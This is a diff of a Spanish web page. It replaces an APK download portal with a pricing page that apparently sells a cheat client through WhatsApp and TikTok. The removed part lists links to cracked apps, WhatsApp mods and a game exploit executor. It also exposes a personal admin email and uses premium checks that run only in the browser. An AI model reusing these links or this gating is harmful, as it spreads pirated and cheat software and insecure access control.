@@ -3,308 +3,495 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS APKS 🌪️ | TECHNO-ELITE V4.0</title>
-    
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
-
+    <title>NEXUS STORE 💎</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root {
-            --glow-green: #00ff88;
-            --glow-gold: #ffd700;
-            --glow-red: #ff3131;
-            --bg-dark: #020202;
-            --panel-bg: rgba(10, 10, 10, 0.95);
-            --tech-border: 1px solid rgba(0, 255, 136, 0.3);
-            --neon-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
+        /* --- ESTILOS GENERALES Y RESET --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
-        * { box-sizing: border-box; scroll-behavior: smooth; -webkit-tap-highlight-color: transparent; }
-        body { 
-            background: var(--bg-dark); 
-            color: #fff; 
-            margin: 0; 
-            font-family: 'Rajdhani', sans-serif;
+        body {
+            background-color: #050505; /* Fondo negro profundo */
+            color: white;
             overflow-x: hidden;
+            scroll-behavior: smooth;
         }
 
-        /* --- INTRO TECNOLÓGICA --- */
-        #intro-layer {
-            position: fixed; inset: 0; background: #000; z-index: 10000;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-        }
-        .matrix-text {
-            font-family: 'Orbitron', sans-serif; font-size: 2.2rem; font-weight: 900;
-            background: linear-gradient(90deg, #000, var(--glow-green), #000);
-            background-size: 200%; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            animation: shine 2s linear infinite, shockwave 1.2s ease-out;
-        }
-        @keyframes shine { to { background-position: 200%; } }
-        @keyframes shockwave { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
-
-        /* --- AUTH SCREEN --- */
-        .auth-screen {
-            display: none; align-items: center; justify-content: center;
-            min-height: 100vh; background: radial-gradient(circle at center, #111 0%, #000 100%);
-            padding: 20px;
-        }
-        .glass-panel {
-            background: var(--panel-bg); padding: 30px; border-radius: 20px;
-            width: 100%; max-width: 400px; border: var(--tech-border);
-            box-shadow: var(--neon-shadow); text-align: center;
+        /* --- COLORES NEÓN Y VARIABLES --- */
+        :root {
+            --neon-orange: #ff6600;
+            --neon-orange-glow: rgba(255, 102, 0, 0.8);
+            --neon-purple: #9d00ff;
+            --neon-purple-glow: rgba(157, 0, 255, 0.8);
+            --neon-blue: #00d2ff;
+            --neon-green: #00ff88;
+            --neon-gold: #ffcc00;
+            --neon-whatsapp: #25d366;
+            --tiktok-link: 'https://tiktok.com/@softworks32'; /* URL de TikTok para usar en JS */
         }
 
-        /* --- UI ELEMENTS --- */
-        .tech-input {
-            width: 100%; padding: 14px; margin: 10px 0; background: rgba(255,255,255,0.05);
-            border: 1px solid #333; color: var(--glow-green); border-radius: 8px;
-            font-family: 'Orbitron'; outline: none; transition: 0.3s;
-        }
-        .btn-glitch {
-            width: 100%; padding: 15px; border: none; border-radius: 8px;
-            font-family: 'Orbitron'; font-weight: 900; cursor: pointer;
-            text-transform: uppercase; letter-spacing: 1px; margin-top: 10px;
-        }
-        .btn-green { background: var(--glow-green); color: #000; box-shadow: 0 0 15px rgba(0,255,136,0.4); }
-        .btn-gold { background: var(--glow-gold); color: #000; }
-
-        /* --- NAVBAR --- */
-        nav {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 12px 5%; background: rgba(0,0,0,0.9); border-bottom: var(--tech-border);
-            position: sticky; top: 0; z-index: 900; backdrop-filter: blur(10px);
-        }
-        .admin-crown {
-            width: 40px; height: 40px; border-radius: 50%; border: 2px solid var(--glow-gold);
-            display: flex; align-items: center; justify-content: center; cursor: pointer;
-            background: #000; box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        /* --- ANIMACIÓN DE ENTRADA (INTRO) --- */
+        #intro-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeOutIntro 1s ease-in 6s forwards; /* Salida al final */
         }
 
-        /* --- GRID 2X2 --- */
-        .apk-grid {
-            display: grid; grid-template-columns: repeat(2, 1fr);
-            gap: 15px; padding: 15px; max-width: 900px; margin: 0 auto;
+        .intro-text-wrapper {
+            perspective: 1000px; /* Para efecto 3D */
+            text-align: center;
         }
-        .apk-card {
-            background: #0a0a0a; border-radius: 12px; border: 1px solid #222;
-            overflow: hidden; position: relative; aspect-ratio: 1/1.2;
-        }
-        .apk-card img { width: 100%; height: 100%; object-fit: cover; }
-        .apk-overlay {
-            position: absolute; inset: 0; background: rgba(0,0,0,0.85);
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            opacity: 0; transition: 0.3s; padding: 10px; text-align: center;
-        }
-        .apk-card:hover .apk-overlay { opacity: 1; }
 
-        /* --- MODALES --- */
-        .modal-overlay {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-            z-index: 5000; padding: 20px; overflow-y: auto;
+        .intro-text {
+            font-size: 4rem;
+            font-weight: bold;
+            color: #fff;
+            text-transform: uppercase;
+            display: inline-block;
+            position: relative;
+            transform-style: preserve-3d;
+            animation: text3D 7s ease-in-out forwards;
         }
-        .modal-tech {
-            background: #080808; border: 1px solid #333; border-radius: 20px;
-            max-width: 450px; margin: 40px auto; padding: 25px;
+
+        .intro-text .line1 {
+            color: var(--neon-orange);
+            text-shadow: 
+                0 0 10px var(--neon-orange-glow),
+                0 0 20px var(--neon-orange-glow),
+                0 0 40px var(--neon-orange-glow);
+            animation: typingLine1 2s steps(6) 0.5s forwards, glowOrange 1.5s ease-in-out infinite alternate 2.5s;
+            width: 0;
+            overflow: hidden;
+            white-space: nowrap;
+            display: block;
+        }
+
+        .intro-text .line2 {
+            font-size: 3rem;
+            animation: typingLine2 2s steps(6) 2.5s forwards, glowPurple 1.5s ease-in-out infinite alternate 4.5s;
+            color: #fff;
+            width: 0;
+            overflow: hidden;
+            white-space: nowrap;
+            display: block;
+        }
+
+        /* Animaciones para el intro */
+        @keyframes typingLine1 { to { width: 100%; } }
+        @keyframes typingLine2 { to { width: 100%; } }
+
+        @keyframes text3D {
+            0% { transform: rotateX(90deg) scale(0.5); opacity: 0; }
+            10% { transform: rotateX(0deg) scale(1); opacity: 1; }
+            80% { transform: rotateX(0deg) scale(1) translateZ(0); opacity: 1; }
+            90% { transform: rotateX(-20deg) scale(2.5) translateZ(100px); opacity: 0.5; }
+            100% { transform: rotateX(-20deg) scale(3) translateZ(200px); opacity: 0; visibility: hidden;}
+        }
+
+        @keyframes glowOrange {
+            from { text-shadow: 0 0 10px var(--neon-orange-glow), 0 0 20px var(--neon-orange-glow); }
+            to { text-shadow: 0 0 20px var(--neon-orange-glow), 0 0 40px var(--neon-orange-glow), 0 0 60px var(--neon-orange-glow); }
+        }
+
+        @keyframes glowPurple {
+            from { text-shadow: 0 0 10px rgba(255,255,255,0.5); color: #fff; }
+            to { text-shadow: 0 0 20px var(--neon-purple-glow), 0 0 40px var(--neon-purple-glow); color: var(--neon-purple); }
+        }
+
+        @keyframes fadeOutIntro {
+            0% { opacity: 1; }
+            100% { opacity: 0; visibility: hidden; }
+        }
+
+        /* --- PÁGINA PRINCIPAL --- */
+        #main-content {
+            opacity: 0;
+            animation: fadeInMain 1s ease-out 6.5s forwards;
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        @keyframes fadeInMain { to { opacity: 1; } }
+
+        /* HEADER */
+        header {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        header h1 {
+            font-size: 3.5rem;
+            text-transform: uppercase;
+            color: #fff;
+            text-shadow: 0 0 20px var(--neon-purple-glow);
+            margin-bottom: 10px;
+        }
+
+        header h1 span {
+            color: var(--neon-purple);
+        }
+
+        header p {
+            font-size: 1.2rem;
+            color: #ccc;
+            margin-bottom: 10px;
+        }
+
+        header ul {
+            list-style: none;
+            color: #aaa;
+            font-size: 1rem;
+        }
+
+        /* WHATSAPP SECTION */
+        .whatsapp-section {
+            text-align: center;
+            margin-bottom: 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .whatsapp-title {
+            font-size: 1.5rem;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .whatsapp-btn {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background-color: var(--neon-whatsapp);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 4rem;
+            color: white;
+            text-decoration: none;
+            box-shadow: 0 0 30px rgba(37, 211, 102, 0.5);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .whatsapp-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 50px rgba(37, 211, 102, 0.8);
+        }
+
+        /* PRECIOS GRID */
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            width: 100%;
+            max-width: 1200px;
+        }
+
+        /* CUADROS DE PRECIO ESTILO GENERAL */
+        .price-card {
+            background: rgba(20, 20, 20, 0.8);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .price-card:hover {
+            transform: translateY(-10px);
+        }
+
+        .card-duration {
+            font-size: 1.8rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+        }
+
+        .card-price {
+            font-size: 3rem;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+
+        .card-features {
+            list-style: none;
+            text-align: left;
+            margin-bottom: 30px;
+            color: #ccc;
+            font-size: 1.1rem;
+            line-height: 1.8;
+        }
+
+        .card-features li::before {
+            content: "🟢 ";
+        }
+
+        /* BOTÓN COMPRAR */
+        .buy-btn {
+            background: none;
+            border: 2px solid;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            border-radius: 50px;
+            color: white;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        /* COLORES ESPECÍFICOS POR TARJETA */
+
+        /* 1 DÍA - AZUL */
+        .card-blue {
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 15px rgba(0, 210, 255, 0.2);
+        }
+        .card-blue:hover { box-shadow: 0 0 30px rgba(0, 210, 255, 0.5); }
+        .card-blue .card-duration, .card-blue .card-price { color: var(--neon-blue); text-shadow: 0 0 10px rgba(0, 210, 255, 0.5); }
+        .card-blue .buy-btn { border-color: var(--neon-blue); }
+        .card-blue .buy-btn:hover { background-color: var(--neon-blue); box-shadow: 0 0 20px var(--neon-blue); }
+
+        /* 7 DÍAS - VERDE */
+        .card-green {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
+        }
+        .card-green:hover { box-shadow: 0 0 30px rgba(0, 255, 136, 0.5); }
+        .card-green .card-duration, .card-green .card-price { color: var(--neon-green); text-shadow: 0 0 10px rgba(0, 255, 136, 0.5); }
+        .card-green .buy-btn { border-color: var(--neon-green); }
+        .card-green .buy-btn:hover { background-color: var(--neon-green); box-shadow: 0 0 20px var(--neon-green); }
+
+        /* 15 DÍAS - MORADO */
+        .card-purple {
+            border-color: var(--neon-purple);
+            box-shadow: 0 0 15px rgba(157, 0, 255, 0.2);
+        }
+        .card-purple:hover { box-shadow: 0 0 30px rgba(157, 0, 255, 0.5); }
+        .card-purple .card-duration, .card-purple .card-price { color: var(--neon-purple); text-shadow: 0 0 10px rgba(157, 0, 255, 0.5); }
+        .card-purple .buy-btn { border-color: var(--neon-purple); }
+        .card-purple .buy-btn:hover { background-color: var(--neon-purple); box-shadow: 0 0 20px var(--neon-purple); }
+
+        /* 1 MES - DORADO */
+        .card-gold {
+            border-color: var(--neon-gold);
+            box-shadow: 0 0 15px rgba(255, 204, 0, 0.2);
+        }
+        .card-gold:hover { box-shadow: 0 0 30px rgba(255, 204, 0, 0.5); }
+        .card-gold .card-duration, .card-gold .card-price { color: var(--neon-gold); text-shadow: 0 0 10px rgba(255, 204, 0, 0.5); }
+        .card-gold .buy-btn { border-color: var(--neon-gold); }
+        .card-gold .buy-btn:hover { background-color: var(--neon-gold); box-shadow: 0 0 20px var(--neon-gold); }
+
+
+        /* TOAST NOTIFICATION (Para feedback al copiar) */
+        #toast {
+            visibility: hidden;
+            min-width: 250px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 10px;
+            padding: 16px;
+            position: fixed;
+            z-index: 1001; /* Encima de todo */
+            left: 50%;
+            bottom: 30px;
+            transform: translateX(-50%);
+            border: 1px solid var(--neon-purple);
+            box-shadow: 0 0 15px var(--neon-purple-glow);
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out, visibility 0.5s ease-in-out;
+        }
+
+        #toast.show {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 600px) {
+            .intro-text { font-size: 2.5rem; }
+            .intro-text .line2 { font-size: 2rem; }
+            header h1 { font-size: 2.5rem; }
+            .pricing-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
 
-    <div id="intro-layer">
-        <div class="matrix-text">NEXUS APKS 🌪️</div>
-        <p style="color: #444; font-family: 'Orbitron'; margin-top: 10px;">SYSTEM V4.0 LOADING...</p>
-    </div>
-
-    <div id="auth-section" class="auth-screen">
-        <div class="glass-panel" id="login-container">
-            <h2 style="font-family: 'Orbitron'; color: var(--glow-green);">LOGIN</h2>
-            <input type="email" id="l-email" class="tech-input" placeholder="CORREO">
-            <input type="password" id="l-pass" class="tech-input" placeholder="CONTRASEÑA">
-            <button class="btn-glitch btn-green" onclick="doLogin()">INICIALIZAR</button>
-            <button class="btn-glitch" onclick="guestMode()" style="background:#222; color:#fff;">GUEST MODE</button>
-            <p style="font-size:0.8rem; margin-top:15px;">¿NUEVO? <span onclick="toggleAuth()" style="color:var(--glow-green); cursor:pointer">REGÍSTRATE</span></p>
-        </div>
-        
-        <div class="glass-panel" id="register-container" style="display:none">
-            <h2 style="font-family: 'Orbitron'; color: var(--glow-green);">NUEVO ID</h2>
-            <input type="text" id="r-user" class="tech-input" placeholder="USUARIO">
-            <input type="email" id="r-email" class="tech-input" placeholder="CORREO">
-            <input type="password" id="r-pass" class="tech-input" placeholder="CONTRASEÑA">
-            <button class="btn-glitch btn-green" onclick="doRegister()">CREAR CUENTA</button>
-            <button class="btn-glitch" onclick="toggleAuth()" style="background:#222; color:#fff;">VOLVER</button>
-        </div>
-    </div>
-
-    <div id="main-dashboard" style="display:none">
-        <nav>
-            <div style="font-family: 'Orbitron'; font-weight: 900; color: var(--glow-green);">NEXUS</div>
-            <div style="display:flex; align-items:center; gap:10px">
-                <div id="admin-icon" class="admin-crown" style="display:none" onclick="openModal('m-admin')">👑</div>
-                <div id="status-tag" style="font-size:0.7rem; border:1px solid #444; padding:5px 10px; border-radius:20px;">FREE</div>
-                <button onclick="logout()" style="background:var(--glow-red); border:none; color:white; border-radius:5px; padding:5px 10px; cursor:pointer;">X</button>
+    <div id="intro-screen">
+        <div class="intro-text-wrapper">
+            <div class="intro-text">
+                <span class="line1">NEXUS</span>
+                <span class="line2">STORE 💎</span>
             </div>
-        </nav>
-
-        <div style="text-align:center; padding:20px;">
-            <a href="https://whatsapp.com/channel/0029VbC12x4GufIzNYfrPh3R" target="_blank" class="btn-glitch btn-green" style="display:inline-block; width:auto; text-decoration:none; padding:10px 20px;">CANAL OFICIAL 📢</a>
-            <button class="btn-glitch btn-gold" onclick="openModal('m-shop')" style="display:inline-block; width:auto; margin-left:10px; padding:10px 20px;">PREMIUM 💎</button>
-        </div>
-
-        <div class="apk-grid" id="apk-container"></div>
-    </div>
-
-    <div id="m-shop" class="modal-overlay">
-        <div class="modal-tech">
-            <h2 style="color:var(--glow-gold); font-family:'Orbitron'; text-align:center;">TIENDA VIP 💎</h2>
-            <button class="btn-glitch btn-green" onclick="buyPack('15 DÍAS')">PLAN 15 DÍAS</button>
-            <button class="btn-glitch btn-green" onclick="buyPack('30 DÍAS')">PLAN 30 DÍAS</button>
-            <button class="btn-glitch" onclick="closeModal('m-shop')" style="background:#222; color:white;">CERRAR</button>
         </div>
     </div>
 
-    <div id="m-admin" class="modal-overlay">
-        <div class="modal-tech">
-            <h2 style="color:var(--glow-gold); font-family:'Orbitron'">ADMIN CONTROL</h2>
-            <input type="email" id="ad-email" class="tech-input" placeholder="CORREO DEL USUARIO">
-            <button class="btn-glitch btn-green" onclick="givePremium(15)">DAR 15 DÍAS VIP</button>
-            <button class="btn-glitch btn-green" onclick="givePremium(30)">DAR 30 DÍAS VIP</button>
-            <button class="btn-glitch" onclick="closeModal('m-admin')" style="background:#222; color:white;">CERRAR</button>
-        </div>
+    <div id="main-content">
+        <header>
+            <h1>NEXUS <span>STORE</span> 👑</h1>
+            <p>Tu mejor opción, precios económicos</p>
+            <ul>
+                <li>Descuentos y más</li>
+            </ul>
+        </header>
+
+        <section class="whatsapp-section">
+            <h2 class="whatsapp-title">Canal de WhatsApp <br> Descuentos y más 🔥</h2>
+            <a href="https://whatsapp.com/channel/0029VbC12x4GufIzNYfrPh3R" target="_blank" class="whatsapp-btn">
+                <i class="fab fa-whatsapp"></i>
+            </a>
+        </section>
+
+        <section class="pricing-grid">
+
+            <div class="price-card card-blue">
+                <div>
+                    <div class="card-duration">1 DÍA</div>
+                    <div class="card-price">$ 2 USD</div>
+                    <ul class="card-features">
+                        <li>Acceso 24 horas</li>
+                        <li>Entrega inmediata</li>
+                    </ul>
+                </div>
+                <button class="buy-btn" onclick="handleBuyClick('1 DÍA')">COMPRAR 💳</button>
+            </div>
+
+            <div class="price-card card-green">
+                <div>
+                    <div class="card-duration">7 DÍAS</div>
+                    <div class="card-price">$ 7 USD</div>
+                    <ul class="card-features">
+                        <li>Soporte standard</li>
+                        <li>Actualizaciones</li>
+                        <li>Entrega inmediata</li>
+                    </ul>
+                </div>
+                <button class="buy-btn" onclick="handleBuyClick('7 DÍAS')">COMPRAR 💳</button>
+            </div>
+
+            <div class="price-card card-purple">
+                <div>
+                    <div class="card-duration">15 DÍAS</div>
+                    <div class="card-price">$ 12 USD</div>
+                    <ul class="card-features">
+                        <li>Soporte 24/7</li>
+                        <li>Actualizaciones inmediatas</li>
+                        <li>Entrega inmediata</li>
+                    </ul>
+                </div>
+                <button class="buy-btn" onclick="handleBuyClick('15 DÍAS')">COMPRAR 💳</button>
+            </div>
+
+            <div class="price-card card-gold">
+                <div>
+                    <div class="card-duration">1 MES</div>
+                    <div class="card-price">$ 18 USD</div>
+                    <ul class="card-features">
+                        <li>Soporte prioritario</li>
+                        <li>Actualizaciones constantes</li>
+                        <li>Acceso completo</li>
+                        <li>Entrega inmediata</li>
+                    </ul>
+                </div>
+                <button class="buy-btn" onclick="handleBuyClick('1 MES')">COMPRAR 💳</button>
+            </div>
+
+        </section>
     </div>
 
-    <div id="m-terms" class="modal-overlay">
-        <div class="modal-tech" style="border-color:var(--glow-red)">
-            <h2 style="color:var(--glow-red); font-family:'Orbitron'">IMPORTANTE 📄</h2>
-            <p style="font-size:0.8rem; line-height:1.6; color:#ccc;">
-                • Los WhatsApp Mods son exclusivos Premium.<br>
-                • Al vencer tu plan, desinstala para evitar baneos.<br>
-                • Sigue el canal para actualizaciones críticas.
-            </p>
-            <button class="btn-glitch btn-green" onclick="closeModal('m-terms')">ENTIENDO Y ACEPTO</button>
-        </div>
-    </div>
+    <div id="toast">Mensaje copiado al portapapeles.<br>Redirigiendo a TikTok...</div>
 
     <script>
-        // CONFIGURACIÓN FIREBASE
-        const firebaseConfig = {
-            apiKey: "AIzaSyAzzRWHGhYVFgkWyRwfgNKc5Ql52U4xxM8",
-            authDomain: "hyper-drip.firebaseapp.com",
-            projectId: "hyper-drip",
-            databaseURL: "https://hyper-drip-default-rtdb.firebaseio.com"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
-        const db = firebase.database();
+        // URL de TikTok definida en una variable global para fácil acceso
+        const tiktokUrl = 'https://tiktok.com/@softworks32';
 
-        const APKS = [
-            { n: "CAP CUT PRO", i: "https://i.ibb.co/Nd4ZW59d/images.jpg", l: "https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file", r: true, w: "210MB" },
-            { n: "DELTA EXECUTOR", i: "https://i.ibb.co/8g1X87mz/41p-TZNE7m-IL.jpg", l: "https://deltaexploits.gg/delta-executor-android", r: false, w: "15MB" },
-            { n: "DTW MOD MENU", i: "https://i.ibb.co/S4w6Cg99/unnamed.png", l: "https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file", r: false, w: "85MB" },
-            { n: "GTA SAN ANDREAS", i: "https://i.ibb.co/cSwBjTYM/Capture-d-ecran-2025-12-27-184549.png", l: "https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file", r: false, w: "2.4GB" },
-            { n: "CANVA PRO", i: "https://i.ibb.co/xqQPxmSx/Sin-titulo-1-1.png", l: "https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view", r: false, w: "50MB" },
-            { n: "MINECRAFT APK", i: "https://i.ibb.co/pjV6KCT3/images-8.jpg", l: "https://mineckraftapk.com.mx/", r: false, w: "650MB" },
-            { n: "Z ARCHIVER PRO", i: "https://i.ibb.co/h6JfhfN/images.png", l: "https://www.mediafire.com/file/tdg8dtny7eiqvwi/Z+Archiver+Pro+v1.0.10+-+espacioapk.com.apk/file", r: true, w: "5MB" },
-            { n: "GEOMETRY DASH", i: "https://i.ibb.co/fY91dp14/images-2.jpg", l: "https://espacioapk.com/geometry-dash-apk/", r: false, w: "120MB" },
-            { n: "POPPY PLAYTIME 2", i: "https://i.ibb.co/9mN3Fncd/images-1.jpg", l: "https://espacioapk.com/poppy-playtime-chapter-2-apk/", r: true, w: "1.2GB" },
-            { n: "ROPE HERO", i: "https://i.ibb.co/KzsQP1hj/images-3.jpg", l: "https://espacioapk.com/rope-hero-vice-town-mod-apk/", r: false, w: "105MB" },
-            { n: "POPPY PLAYTIME 3", i: "https://i.ibb.co/hxyT2tN7/images-4.jpg", l: "https://dc444.4sync.com/download/nCxOF0Zj/Poppy-Playtime-Chapter-3-v1025.apk", r: true, w: "2.1GB" },
-            { n: "RACE MAX PRO", i: "https://i.ibb.co/8n3Cw5N1/images-5.jpg", l: "https://www.mediafire.com/file/7tldxk3jinb3qeu/race+max+pro+mod+v2.11.6+-+espacioapk.com.apk/file", r: false, w: "380MB" },
-            { n: "SUBWAY SURFERS", i: "https://i.ibb.co/zHGB6HzV/14040184-1191484264248313-485977623053363654-n-png.webp", l: "https://www.mediafire.com/file/u9wr1czw3dfw4g4/subway-surfers-mod-3.61.1+-+espacioapk.com.apk/file", r: false, w: "160MB" },
-            { n: "RISE OF EROS", i: "https://i.ibb.co/DDsX2VHK/images.jpg", l: "https://www.mediafire.com/file/h0f5t8b2c8n9ch1/Rise+of+Eros+-+espacioapk.com.apk/file", r: true, w: "1.8GB" },
-            { n: "KICK THE BUDDY", i: "https://i.ibb.co/ycQ2B3dj/images-1.jpg", l: "https://www.mediafire.com/file/aws2hb59yxy2e33/kick+the+buddy+remastered+mod+v1.14.1526+-+espacioapk.com.apk/file", r: false, w: "110MB" },
-            { n: "BLACK HOLE HERO", i: "https://i.ibb.co/BHxMLfd3/unnamed.webp", l: "https://www.mediafire.com/file_premium/hr5c3sd3anscus5/black_hole_hero_mod_v1.9.8_-_espacioapk.com.apk/file", r: false, w: "140MB" },
-            { n: "TORTUGAS NINJA", i: "https://i.ibb.co/VYYmZxYP/images-6.jpg", l: "https://www.mediafire.com/file/zimz0zv2dfil558/ninja+turtles+legends+mod+v1.27.1+-+espacioapk.com.apk/file", r: false, w: "95MB" },
-            { n: "CAR FOR SALE", i: "https://i.ibb.co/pvpg7RFZ/shopping.webp", l: "https://www.mediafire.com/file_premium/t4c20wl4uspgzbd/car-for-sale-2023-mod-2.0.4_-_espacioapk.com.apk/file", r: false, w: "220MB" },
-            { n: "RAFT SURVIVAL", i: "https://i.ibb.co/Wv0qXhQQ/unnamed-1.webp", l: "https://www.mediafire.com/file/cp9vqmxhyo4xnq2/ocean+nomad+mod+v2.9.0+-+espacioapk.com.apk/file", r: false, w: "135MB" },
-            { n: "CAR SIMULATOR 2", i: "https://i.ibb.co/Gv8MM5MZ/images-1.webp", l: "https://www.mediafire.com/file/aqtch08hwsuag9a/car+simulator+2+mod+v1.61.4+-+espacioapk.com.apk/file", r: true, w: "450MB" },
-            { n: "BLOOD STRIKE", i: "https://i.ibb.co/ynfPjpTS/hqdefault.jpg", l: "https://www.mediafire.com/file/sg548qen5fa1cea/FREE_MOD_BY_KYKYR_CHEATZ.apk/file", r: true, w: "600MB" },
-            { n: "GB WHATSAPP EXTREME", i: "https://i.ibb.co/bj16Q1H3/favicon.png", l: "https://www.mediafire.com/file/e2yrwtq46ab16h1/GBEXTREME_MAS_V26.36E.apk/file", p: true, w: "72MB" },
-            { n: "MB WHATSAPP PLUS", i: "https://i.ibb.co/rGCqw4DX/Whatsapp-plus-logo-2.webp", l: "https://www.mediafire.com/file/yfosnqs5lkb7vfl/MBWhatsApp_2.8.0F_by_stefanoYG.apk/file", p: true, w: "68MB" },
-            { n: "GB WHATSAPP PRO", i: "https://i.ibb.co/bj16Q1H3/favicon.png", l: "https://www.mediafire.com/file/ijzc5qggle2v1yf/G.B-Whats4pp_PR0_v26.36.apk/file", p: true, w: "70MB" }
-        ];
-
-        let isPremium = false, isGuest = false;
-
-        auth.onAuthStateChanged(user => {
-            setTimeout(() => {
-                document.getElementById('intro-layer').style.display = 'none';
-                if(user) { initDash(user); } else if(!isGuest) { document.getElementById('auth-section').style.display = 'flex'; }
-            }, 2000);
-        });
-
-        function initDash(user) {
-            document.getElementById('auth-section').style.display = 'none';
-            document.getElementById('main-dashboard').style.display = 'block';
-            if(user.email === "chrisslorenzohdz@gmail.com") document.getElementById('admin-icon').style.display = 'flex';
-            
-            const key = user.email.replace(/\./g, '_');
-            db.ref('premium_users/'+key).on('value', s => {
-                isPremium = s.exists() && s.val().active;
-                document.getElementById('status-tag').innerText = isPremium ? '💎 PREMIUM' : '👤 FREE';
-                render();
-            });
-            openModal('m-terms');
+        function handleBuyClick(planName) {
+            // 1. Copiar el mensaje personalizado al portapapeles
+            const messageToCopy = `Quiero adquirir drip cliente🟣 de el paquete que eligió: ${planName}`;
+            copyTextToClipboard(messageToCopy);
         }
 
-        function render() {
-            const container = document.getElementById('apk-container');
-            container.innerHTML = "";
-            APKS.forEach(apk => {
-                container.innerHTML += `
-                    <div class="apk-card">
-                        <img src="${apk.i}">
-                        <div class="apk-overlay">
-                            <h4 style="margin:0; font-size:0.8rem;">${apk.n}</h4>
-                            <span style="font-size:0.6rem; color:var(--glow-green)">PESO: ${apk.w}</span>
-                            <button onclick="download('${apk.l}', ${apk.r}, ${apk.p || false})" class="btn-glitch btn-green" style="font-size:0.6rem; padding:8px; margin-top:10px;">DESCARGAR</button>
-                        </div>
-                    </div>
-                `;
-            });
+        async function copyTextToClipboard(text) {
+            if (!navigator.clipboard) {
+                // Fallback para navegadores antiguos
+                const textArea = document.createElement("textarea");
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+                try {
+                    const successful = document.execCommand('copy');
+                    if (successful) {
+                        onCopySuccess();
+                    } else {
+                        onCopyFailure();
+                    }
+                } catch (err) {
+                    onCopyFailure();
+                }
+                document.body.removeChild(textArea);
+                return;
+            }
+            // API del portapapeles moderna
+            try {
+                await navigator.clipboard.writeText(text);
+                onCopySuccess();
+            } catch (err) {
+                onCopyFailure();
+            }
         }
 
-        function download(url, reg, prem) {
-            if(isGuest && (reg || prem)) return alert("REGÍSTRATE PARA ACCEDER");
-            if(prem && !isPremium) return openModal('m-shop');
-            window.open(url, '_blank');
+        function onCopySuccess() {
+            // 2. Mostrar la notificación visual (Toast)
+            showToast();
+            // 3. Redirigir a TikTok después de un breve retraso
+            setTimeout(redirectToTikTok, 1500); // 1.5 segundos de retraso
         }
 
-        async function doLogin() {
-            const e = document.getElementById('l-email').value, p = document.getElementById('l-pass').value;
-            try { await auth.signInWithEmailAndPassword(e, p); } catch(e) { alert(e.message); }
+        function onCopyFailure() {
+            // En caso de error, intentar la redirección de todos modos
+            console.error('No se pudo copiar el texto al portapapeles.');
+            showToast(); // Mostrar toast con mensaje genérico de error si se desea
+            setTimeout(redirectToTikTok, 1000);
         }
 
-        async function doRegister() {
-            const e = document.getElementById('r-email').value, p = document.getElementById('r-pass').value, u = document.getElementById('r-user').value;
-            try { 
-                await auth.createUserWithEmailAndPassword(e, p);
